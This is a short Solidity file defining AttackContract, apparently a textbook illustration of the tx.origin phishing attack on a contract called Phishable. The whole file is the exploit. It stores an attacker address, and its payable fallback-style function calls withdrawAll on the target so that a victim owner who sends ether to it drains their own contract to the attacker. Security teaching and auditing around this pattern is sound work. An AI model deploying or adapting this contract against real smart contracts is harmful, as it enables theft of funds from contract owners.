import "./Phishable.sol";

contract AttackContract {
  Phishable phishableContract;
  address attacker; // The attacker's address to receive funds

  constructor (Phishable _phishableContract, address _attackerAddress){
    phishableContract = _phishableContract;
    attacker = _attackerAddress;
  }

  function fallback() payable {
    phishableContract.withdrawAll(attacker);
  }
}